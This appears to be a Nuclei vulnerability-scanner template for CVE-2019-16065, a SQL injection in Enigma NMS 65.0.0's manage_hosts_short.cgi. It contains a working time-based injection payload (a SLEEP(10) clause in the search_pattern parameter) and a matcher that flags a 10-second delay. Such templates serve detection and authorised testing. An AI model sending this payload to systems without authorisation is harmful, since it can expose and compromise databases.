id: CVE-2019-16065

info:
  name: Enigma NMS 65.0.0 - SQL Injection
  author: daffainfo
  severity: high
  description: A remote SQL injection web vulnerability was discovered in the Enigma NMS 65.0.0 and prior web application that allows an attacker to execute SQL commands to expose and compromise the web server, expose database tables and values, and potentially execute system-based commands as the mysql user. This affects the search_pattern value of the manage_hosts_short.cgi script.
  reference: |
    - https://www.exploit-db.com/exploits/47365
    - https://www.cvedetails.com/cve/CVE-2019-16065
  tags: cve,cve2019,sqli

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/protected/manage_hosts_short.cgi?action=search_proceed&search_pattern=a%' AND SLEEP(10) AND '%'='"

    matchers:
      - type: dsl
        dsl:
          - 'duration==10'
